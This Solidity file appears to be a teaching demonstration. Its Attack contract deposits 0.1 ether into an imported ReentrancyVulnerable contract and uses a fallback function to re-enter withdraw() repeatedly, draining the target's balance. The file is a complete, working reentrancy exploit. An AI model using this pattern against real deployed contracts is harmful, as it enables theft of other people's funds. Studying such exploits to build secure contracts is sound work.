// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./ReentrancyVulnerable.sol";

contract Attack {
    ReentrancyVulnerable public reentrancyVulnerable;

    constructor(address _address) {
        reentrancyVulnerable = ReentrancyVulnerable(_address);
    }

    fallback() external payable {
        if (address(reentrancyVulnerable).balance >= 0.1 ether) {
            reentrancyVulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether);
        reentrancyVulnerable.deposit{value: 0.1 ether}();
        reentrancyVulnerable.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
